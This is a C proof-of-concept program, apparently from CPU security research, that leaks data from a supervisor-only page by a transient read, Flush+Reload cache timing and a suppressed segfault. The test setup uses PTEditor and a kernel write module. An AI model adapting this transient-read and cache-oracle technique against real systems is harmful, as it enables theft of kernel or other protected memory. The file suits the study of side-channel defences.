
#include <fcntl.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include "../PTEditor/ptedit_header.h"
#include "../cacheutils.h"
#include "./module/kernel_write.h"

#define USER_KERNEL_WRITE     1
#define FILL_SB               0
#define PAGE_SIZE 4096
#define offset 20

uint8_t * address_S = NULL, * address_N = NULL, * oracle = NULL, *buffer = NULL;
int kernel_write_fd;
void setup_kernel_module(){
    kernel_write_fd = open(KERNEL_WRITE_DEVICE_PATH, O_RDONLY);
    if (kernel_write_fd < 0) {
        printf ("Error: Can't open device file: %s\n", KERNEL_WRITE_DEVICE_PATH);
        exit(-1);
    }
}

void setup_oracle(){
    printf("[+] Flush+Reload Threshold: ");
    CACHE_MISS = detect_flush_reload_threshold();
    printf("%lu\n", CACHE_MISS);
    for(uint32_t i = 0; i < 256; i++){
        flush((uint8_t *)oracle + i * PAGE_SIZE);
    }
}

void setup_pages(){
    memset(address_N, 'N', PAGE_SIZE);
    memset(address_S, 'S', PAGE_SIZE);
    memset(buffer, 0, PAGE_SIZE * 64);
    ptedit_init();  
    ptedit_pte_clear_bit(address_S, 0, PTEDIT_PAGE_BIT_USER);
    ptedit_cleanup();
}


void setup_fh(){
    signal(SIGSEGV, trycatch_segfault_handler); 
    signal(SIGFPE, trycatch_segfault_handler);
}

void allocate_buffers(){
    address_S = (uint8_t*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    address_N = (uint8_t*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    buffer = (uint8_t*) mmap(NULL, PAGE_SIZE*64, PROT_READ | PROT_WRITE | PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    oracle = (uint8_t*) mmap(NULL, PAGE_SIZE*256, PROT_READ | PROT_WRITE | PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (buffer == MAP_FAILED || oracle == MAP_FAILED || address_S == MAP_FAILED || address_N == MAP_FAILED) {
        fprintf(stderr, "Error: Could not allocate buffers\n");
        exit(-1);
    }
}

int main( int argc, char **argv )
{
    allocate_buffers();
    setup_pages();
    setup_oracle();
    setup_fh();
    setup_kernel_module();
        
    uint8_t * ptr_N = address_N + offset;
    uint8_t * ptr_S = address_S + offset;
            

    while(1){    
    #if FILL_SB
        size_t alternate_offset = (offset + 67) % PAGE_SIZE;
        for (size_t i = 0; i < 64; i++) {
            buffer[alternate_offset + i*4096] = 'Y';
        }
    #endif
                
        if(!setjmp(trycatch_buf))
        {                
        #if USER_KERNEL_WRITE
            *ptr_N = 'D';
        #else
            ioctl(kernel_write_fd, KERNEL_WRITE_IOCTL_CMD_WRITE_OFFSET_ONCE, offset);
        #endif
            asm volatile(
                "movb (%0), %%al\n"
                "and $0xff, %%rax\n"
                "shlq $12, %%rax\n"
                "movb (%1,%%rax,1), %%al\n"
            : : "r" (ptr_S), "r" (oracle));
        }
        
        for (size_t i = 1; i < 256; i++) {
            if (flush_reload((uint8_t *)oracle + i * PAGE_SIZE)) {
                fprintf(stdout, "%c ", (uint8_t)i);
                fflush(stdout);
            }
        }
         
    }

    return 0;
}


